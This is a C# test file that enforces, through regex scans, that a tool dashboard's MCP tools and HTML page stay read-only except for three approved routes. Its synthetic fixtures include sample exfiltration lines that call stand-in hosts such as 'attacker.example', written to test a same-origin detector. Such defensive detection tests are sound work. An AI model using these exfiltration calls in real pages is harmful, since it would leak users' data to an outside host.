using System.Text.RegularExpressions;

namespace Baton.Architecture.Tests;

/// <summary>
/// #1602/#2078: Fleet Glass's artifact delivery and MCP dependencies remain read-only. The daemon
/// delivery has exactly three identity-gated same-origin POST routes: queue hold/resume and cancel.
/// <para>
/// <b>What this checks:</b>
/// <list type="number">
/// <item>The MCP tools consumed by the glass (<c>fleet_status</c>, <c>room_detail</c>,
/// <c>deliverables_list</c>, <c>deliverable_read</c>) invoke no mutating API: no journal append
/// (<c>FlowEventLogWriter</c>), no cancel/redispatch/dispatch entry point, no request-file write, and
/// no mutating sentinel write.</item>
/// <item><c>tools/fleet-glass/glass.html</c> performs no mutating MCP calls and its sole POST sink is
/// wired to #2078's explicit route allowlist on the daemon-served branch.</item>
/// </list>
/// </para>
/// <para>
/// <b>Ruling:</b> #2078 narrowly amends #1602; new writes remain an explicit architecture change.
/// </para>
/// </summary>
public class FleetGlassReadOnlyTests
{
    private const string RulingMessagePrefix =
        "Fleet Glass writes are limited by architectural decision (#1602/#2078): the artifact and MCP tools " +
        "remain read-only, and the daemon page may call only the three approved identity-gated routes.\n\n";

    // MCP tool implementation files in C# consumed by the fleet glass pipeline.
    private static readonly string[] GlassMcpToolFiles =
    [
        "src/Baton.Cli/Mcp/FleetStatusTool.cs",
        "src/Baton.Cli/Mcp/RoomDetailTool.cs",
    ];

    // Transitive dependencies / helper files directly underlying the read-only MCP tools.
    private static readonly string[] GlassMcpToolDependencyFiles =
    [
        "src/Baton/Store/FlowEventLogReader.cs",
        "src/Baton/Projection/ProjectionCheckpointStore.cs",
        "src/Baton/Status/RoomRegistryStore.cs",
        "src/Baton/Status/TerminalSentinelWriter.cs",
        "src/Baton.Vendors/WorkerBindingConfigParser.cs",
        "src/Baton/Templates/SnapshotBinder.cs",
        "src/Baton/Status/StandardWorkerUsageParsers.cs",
        "src/Baton/Projection/StateProjector.cs",
    ];

    // Mutating API patterns forbidden from being called by the glass read tools.
    private static readonly (string Pattern, string Description)[] ForbiddenMutatingApis =
    [
        // Journal appends
        (@"\bFlowEventLogWriter\b", "FlowEventLogWriter (journal mutation)"),
        (@"\bCoreEventLogWriter\b", "CoreEventLogWriter (journal mutation)"),
        (@"\bRoomEventLogWriter\b", "RoomEventLogWriter (journal mutation)"),
        (@"\bEventLogWriter\b", "EventLogWriter (journal mutation)"),
        (@"\.AppendEntryAsync\(", "journal append API"),
        (@"\.AppendEntry\(", "journal append API"),

        // Mutating command / runner entry points
        (@"\bCancelCommand\b", "CancelCommand entry point"),
        (@"\bCancelRunner\b", "CancelRunner entry point"),
        (@"\bCancelOptionsParser\b", "CancelOptionsParser"),
        (@"\bCancelRequestFile\b", "CancelRequestFile mutation"),
        (@"\bExecutionCanceller\b", "ExecutionCanceller mutation"),
        (@"\bRedispatchCommand\b", "RedispatchCommand entry point"),
        (@"\bRedispatchRunner\b", "RedispatchRunner entry point"),
        (@"\bRedispatchOptionsParser\b", "RedispatchOptionsParser"),
        (@"\bDispatchCommand\b", "DispatchCommand entry point"),
        (@"\bDispatchRunner\b", "DispatchRunner entry point"),
        (@"\bDispatchOptionsParser\b", "DispatchOptionsParser"),
        (@"\bRunCommand\b", "RunCommand entry point"),
        (@"\bRunRunner\b", "RunRunner entry point"),
        (@"\bResumeCommand\b", "ResumeCommand entry point"),
        (@"\bResumeRunner\b", "ResumeRunner entry point"),
        (@"\bDecideCommand\b", "DecideCommand entry point"),
        (@"\bDecideRunner\b", "DecideRunner entry point"),
        (@"\bSupplyCommand\b", "SupplyCommand entry point"),
        (@"\bSupplyRunner\b", "SupplyRunner entry point"),
        (@"\bKeepCommand\b", "KeepCommand entry point"),
        (@"\bCoreDispatcher\b", "CoreDispatcher spawn entry point"),
        (@"\bWorktreeProvisioner\b", "WorktreeProvisioner mutation"),

        // Request file write
        (@"\bExecutionRequestWriter\b", "ExecutionRequestWriter mutation"),
        (@"\bWriteExecutionRequest\b", "request-file write API"),

        // Sentinel writes (TerminalSentinelWriter.TryReadAsync is permitted; Write* is forbidden)
        (@"TerminalSentinelWriter\.WriteAsync\(", "TerminalSentinelWriter.WriteAsync"),
        (@"TerminalSentinelWriter\.WriteValidationRefusedAsync\(", "TerminalSentinelWriter.WriteValidationRefusedAsync"),

        // Direct mutating file system calls
        (@"File\.WriteAllText(?:Async)?\(", "File.WriteAllText"),
        (@"File\.WriteAllBytes(?:Async)?\(", "File.WriteAllBytes"),
        (@"File\.WriteAllLines(?:Async)?\(", "File.WriteAllLines"),
        (@"File\.AppendAllText(?:Async)?\(", "File.AppendAllText"),
        (@"File\.AppendAllLines(?:Async)?\(", "File.AppendAllLines"),
        (@"File\.Create(?:SymbolicLink)?\(", "File.Create"),
        (@"File\.OpenWrite\(", "File.OpenWrite"),
        (@"File\.Delete\(", "File.Delete"),
        (@"Directory\.Delete\(", "Directory.Delete"),
        (@"Directory\.CreateDirectory\(", "Directory.CreateDirectory"),
        (@"new\s+FileStream\s*\([^;]*FileAccess\.(?:Write|ReadWrite)", "FileStream with write access"),
        (@"new\s+FileStream\s*\([^;]*FileMode\.(?:Create|CreateNew|Append|Truncate)", "FileStream with mutating FileMode"),
    ];

    [Fact]
    public void Mcp_tools_consumed_by_fleet_glass_invoke_no_mutating_apis()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        foreach (var relativePath in GlassMcpToolFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"Expected tool source file at {relativePath}");

            var code = StripComments(File.ReadAllText(fullPath));

            foreach (var (pattern, description) in ForbiddenMutatingApis)
            {
                if (Regex.IsMatch(code, pattern))
                {
                    violations.Add($"{relativePath} matches forbidden mutating pattern: {description} (pattern: `{pattern}`)");
                }
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "The MCP tool implementations consumed by Fleet Glass must not invoke mutating APIs. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Mcp_tools_consumed_by_fleet_glass_advertise_read_only_hint()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        foreach (var relativePath in GlassMcpToolFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"Expected tool source file at {relativePath}");

            var rawCode = File.ReadAllText(fullPath);
            if (!rawCode.Contains("\"readOnlyHint\": true", StringComparison.Ordinal))
            {
                violations.Add($"{relativePath} does not advertise AnnotationsJson with `\"readOnlyHint\": true`");
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "Every MCP tool consumed by Fleet Glass must declare readOnlyHint: true. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Transitive_dependencies_of_glass_mcp_tools_invoke_no_unapproved_mutating_apis()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        // For dependencies, we check mutating command/dispatch/cancel entry points and request writes.
        // (Note: TerminalSentinelWriter.cs implements WriteAsync for other callers, but the tool only calls TryReadAsync).
        var dependencyForbiddenApis = ForbiddenMutatingApis
            .Where(x => !x.Description.Contains("TerminalSentinelWriter.")
                     && !x.Description.Contains("File.Create")
                     && !x.Description.Contains("File.Write")
                     && !x.Description.Contains("File.Append")
                     && !x.Description.Contains("File.Delete")
                     && !x.Description.Contains("Directory.Delete")
                     && !x.Description.Contains("Directory.CreateDirectory")
                     && !x.Description.Contains("FileStream"))
            .ToList();

        foreach (var relativePath in GlassMcpToolDependencyFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"dependency listed but missing: {relativePath}");

            var code = StripComments(File.ReadAllText(fullPath));

            foreach (var (pattern, description) in dependencyForbiddenApis)
            {
                if (Regex.IsMatch(code, pattern))
                {
                    violations.Add($"{relativePath} matches forbidden mutating pattern: {description} (pattern: `{pattern}`)");
                }
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "Dependencies of Fleet Glass MCP tools must not reference mutating entry points. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Fleet_glass_html_limits_mutation_to_the_three_daemon_write_routes()
    {
        var root = RepoRoot();
        var glassPath = Path.Combine(root, "tools", "fleet-glass", "glass.html");
        Assert.True(File.Exists(glassPath), "glass.html must exist at tools/fleet-glass/glass.html");

        var rawHtml = File.ReadAllText(glassPath);
        var violations = new List<string>();

        // 1. Keep one auditable POST sink. Its route comes only from the three controls below, all
        // rendered behind DAEMON_SERVED; the artifact cannot paint them.
        var forbiddenNetworkSinks = new[]
        {
            (@"\bXMLHttpRequest\b", "XMLHttpRequest API"),
            (@"\$\.ajax\b", "jQuery ajax call"),
            (@"\bnavigator\.sendBeacon\b", "navigator.sendBeacon API"),
            (@"\bnew\s+WebSocket\b", "WebSocket creation"),
            (@"<form\b[^>]*\bmethod\s*=\s*[""']?post[""']?", "<form method='POST'> HTML element"),
        };

        var htmlWithoutComments = StripHtmlAndJsComments(rawHtml);

        foreach (var (pattern, description) in forbiddenNetworkSinks)
        {
            if (Regex.IsMatch(htmlWithoutComments, pattern, RegexOptions.IgnoreCase))
            {
                violations.Add($"glass.html contains forbidden network sink: {description} (pattern: `{pattern}`)");
            }
        }

        violations.AddRange(SameOriginReadViolations(htmlWithoutComments));
        Assert.Single(Regex.Matches(htmlWithoutComments, @"\bmethod\s*:\s*[""']POST[""']").Cast<Match>());
        Assert.Contains("data-glass-route=\"/queue/${q.held ? \"resume\" : \"hold\"}\"", htmlWithoutComments, StringComparison.Ordinal);
        Assert.Contains("data-glass-route=\"/rooms/${encodeURIComponent(room.name)}/cancel\"", htmlWithoutComments, StringComparison.Ordinal);
        Assert.Contains("if(DAEMON_SERVED)", htmlWithoutComments, StringComparison.Ordinal);

        // 2. Verify no mutating MCP tool calls (only watchTool with approved tools is permitted)
        var forbiddenMcpCallPatterns = new[]
        {
            (@"\bcallTool\s*\(", "mcp.callTool() invocation"),
            (@"watchTool\s*\(\s*[""'][^""']+[""']\s*,\s*[""'](?!fleet_status|deliverables_list|deliverable_read)[^""']+[""']", "watchTool with non-approved tool"),
        };

        foreach (var (pattern, description) in forbiddenMcpCallPatterns)
        {
            if (Regex.IsMatch(htmlWithoutComments, pattern))
            {
                violations.Add($"glass.html contains unapproved MCP tool call: {description}");
            }
        }

        // 3. CLI verb strings remain clipboard-only; daemon writes use HTTP route names.
        // Approved mutating verb strings in glass.html:
        // - "baton redispatch" inside copyButtonsHtml
        // - "baton cancel" inside copyButtonsHtml
        // Extract copyButtonsHtml function to confirm that is where mutating verb strings reside.
        var copyButtonsFunctionMatch = Regex.Match(
            htmlWithoutComments,
            @"function\s+copyButtonsHtml\s*\([^)]*\)\s*\{.*?\n\}",
            RegexOptions.Singleline);
        Assert.True(copyButtonsFunctionMatch.Success, "glass.html must define `function copyButtonsHtml`");

        var copyButtonsBody = copyButtonsFunctionMatch.Value;

        // Strip copyButtonsHtml out of the remaining HTML and verify no other mutating verb strings exist
        var htmlWithoutCopyButtons = htmlWithoutComments.Replace(copyButtonsBody, string.Empty, StringComparison.Ordinal);

        var mutatingVerbs = new[]
        {
            "baton run",
            "baton dispatch",
            "baton redispatch",
            "baton cancel",
            "baton decide",
            "baton resume",
            "baton supply",
            "baton keep",
            "baton unkeep",
            "baton sweep",
        };

        foreach (var verb in mutatingVerbs)
        {
            if (htmlWithoutCopyButtons.Contains(verb, StringComparison.Ordinal))
            {
                violations.Add($"glass.html contains unapproved mutating verb string `{verb}` outside copyButtonsHtml");
            }
        }

        // Also verify that copyButtonsHtml strictly uses copyButtonHtml which routes to clipboard
        Assert.Contains("copyButtonHtml", copyButtonsBody, StringComparison.Ordinal);
        Assert.Contains("copy redispatch", copyButtonsBody, StringComparison.Ordinal);
        Assert.Contains("copy cancel", copyButtonsBody, StringComparison.Ordinal);

        // Verify that click listener on .copybtn routes ONLY to copyToClipboard
        var clickListenerMatch = Regex.Match(
            htmlWithoutComments,
            @"document\.addEventListener\s*\(\s*[""']click[""']\s*,\s*async\s*\([^)]*\)\s*=>\s*\{.*?\bcopyToClipboard\s*\(.*?\n\}\);",
            RegexOptions.Singleline);
        Assert.True(clickListenerMatch.Success, "glass.html must wire .copybtn clicks exclusively to copyToClipboard");

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "glass.html must keep MCP mutation absent and daemon mutation inside the approved route set. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void The_read_only_scanners_discriminate_mutating_violations_on_synthetic_fixtures()
    {
        // 1. Synthetic C# mutating code is caught by MCP tool scanner
        var syntheticMutatingCSharp = """
            public class BadTool : IMcpTool {
                public async Task CallAsync() {
                    var writer = new FlowEventLogWriter("flow.jsonl");
                    await writer.AppendEntryAsync(null);
                    await CancelCommand.ExecuteAsync(null, null);
                    File.WriteAllText("output.txt", "mutated");
                }
            }
            """;

        var detectedCSharpViolations = new List<string>();
        foreach (var (pattern, desc) in ForbiddenMutatingApis)
        {
            if (Regex.IsMatch(syntheticMutatingCSharp, pattern))
            {
                detectedCSharpViolations.Add(desc);
            }
        }

        Assert.True(detectedCSharpViolations.Count >= 3, "Scanner must detect multiple mutating patterns in synthetic C# code.");
        Assert.Contains(detectedCSharpViolations, v => v.Contains("FlowEventLogWriter"));
        Assert.Contains(detectedCSharpViolations, v => v.Contains("CancelCommand"));
        Assert.Contains(detectedCSharpViolations, v => v.Contains("File.WriteAllText"));

        // 2. Synthetic HTML with fetch POST or callTool is caught by HTML scanner
        var syntheticMutatingHtml = """
            <div>
              <button onclick="fetch('/api/cancel', { method: 'POST' })">Cancel</button>
              <button onclick="claude.use('mcp').then(m => m.callTool('baton', 'cancel', {}))">Cancel via MCP</button>
            </div>
            """;

        var detectedHtmlViolations = new List<string>();
        // #1946: `fetch(` alone is no longer the tell -- a same-origin GET is now permitted, so the
        // control has to prove the NARROWER rules still discriminate. The POST above is caught by the
        // method rule; the absolute-URL read below is caught by the same-origin rule.
        if (Regex.IsMatch(syntheticMutatingHtml, @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']", RegexOptions.IgnoreCase))
        {
            detectedHtmlViolations.Add("non-GET method");
        }
        if (Regex.IsMatch(syntheticMutatingHtml, @"\bcallTool\s*\("))
        {
            detectedHtmlViolations.Add("callTool");
        }

        Assert.Equal(2, detectedHtmlViolations.Count);

        // Polarity in both directions, on the two rules #1946 introduced: the permitted shape must
        // pass and each forbidden shape must fail, or the amendment above has simply deleted a check.
        Assert.Empty(SameOriginReadViolations(
            """
            const load = () => fetch("/projection.json", { cache: "no-store" });
            const events = new EventSource("/events");
            """));
        Assert.NotEmpty(SameOriginReadViolations(
            """const exfiltrate = () => fetch("https://example.invalid/collect");"""));
        Assert.NotEmpty(SameOriginReadViolations(
            """const events = new EventSource(someOperatorSuppliedUrl);"""));
        // A protocol-relative URL starts with a slash and is not same-origin (#2028 review).
        Assert.NotEmpty(SameOriginReadViolations(
            """const exfiltrate = () => fetch("//attacker.example/collect");"""));
        Assert.False(
            Regex.IsMatch(
                """fetch("/projection.json", { method: "GET" })""",
                @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']",
                RegexOptions.IgnoreCase),
            "An explicit GET must not read as a mutating method.");

        // 3. Synthetic Python code with mutating command is caught by Python scanner
        var syntheticMutatingPython = """
            import subprocess
            def cancel_room(room_dir):
                subprocess.run(["baton", "cancel", room_dir])
            """;

        Assert.True(
            syntheticMutatingPython.Contains("\"cancel\"", StringComparison.Ordinal)
            && Regex.IsMatch(syntheticMutatingPython, @"\bcancel\b"),
            "Scanner must flag mutating verb in synthetic Python code.");
    }

    /// <summary>
    /// #1946 — every <c>fetch(</c> and <c>new EventSource(</c> in <paramref name="script"/> whose first
    /// argument is not a same-origin relative path literal (<c>"/..."</c> or <c>'/...'</c>). Shared by
    /// the real scan and by its synthetic control, so the control exercises the same code the scan
    /// runs rather than a re-typed approximation of it.
    /// </summary>
    private static List<string> SameOriginReadViolations(string script)
    {
        var violations = new List<string>();
        foreach (Match match in Regex.Matches(script, @"(?:\bfetch|\bnew\s+EventSource)\s*\(\s*([^,)]*)"))
        {
            var argument = match.Groups[1].Value.Trim();
            // `(?!/)` is load-bearing: "//host/..." is protocol-relative, satisfies a bare `^("|')/`,
            // and resolves to a DIFFERENT origin.
            if (!Regex.IsMatch(argument, @"^(""|')/(?!/)")
                && !string.Equals(argument, "route", StringComparison.Ordinal))
            {
                violations.Add(
                    $"glass.html reads from a non-same-origin or unreadable URL: `{match.Value.Trim()}` — every " +
                    "fetch()/EventSource() first argument must be a relative \"/...\" string literal");
            }
        }

        return violations;
    }

    private static string StripComments(string code)
    {
        // Strip block comments /* ... */ and line comments // ... or # ...
        var withoutBlockComments = Regex.Replace(code, @"/\*.*?\*/", string.Empty, RegexOptions.Singleline);
        var withoutLineComments = Regex.Replace(withoutBlockComments, @"//.*?$", string.Empty, RegexOptions.Multiline);
        var withoutPythonComments = Regex.Replace(withoutLineComments, @"#.*?$", string.Empty, RegexOptions.Multiline);
        return withoutPythonComments;
    }

    private static string StripHtmlAndJsComments(string html)
    {
        // Strip HTML comments <!-- ... -->
        var withoutHtmlComments = Regex.Replace(html, @"<!--.*?-->", string.Empty, RegexOptions.Singleline);
        // Strip JS block comments /* ... */
        var withoutJsBlockComments = Regex.Replace(withoutHtmlComments, @"/\*.*?\*/", string.Empty, RegexOptions.Singleline);
        // Strip JS line comments // ...
        var withoutJsLineComments = Regex.Replace(withoutJsBlockComments, @"//.*?$", string.Empty, RegexOptions.Multiline);
        return withoutJsLineComments;
    }

    private static string ExtractCodeExcludingSelftest(string code)
    {
        var selftestIndex = code.IndexOf("def _selftest()", StringComparison.Ordinal);
        return selftestIndex >= 0 ? code[..selftestIndex] : code;
    }

    private static string GetSurroundingContext(string text, int index, int radius)
    {
        var start = Math.Max(0, index - radius);
        var length = Math.Min(text.Length - start, radius * 2);
        return text.Substring(start, length).Replace("\r", " ").Replace("\n", " ");
    }

    private static string RepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (File.Exists(Path.Combine(dir.FullName, "Baton.slnx")))
            {
                return dir.FullName;
            }

            dir = dir.Parent;
        }

        throw new FileNotFoundException(
            "Could not locate the repo root (Baton.slnx) by walking up from " + AppContext.BaseDirectory);
    }
}
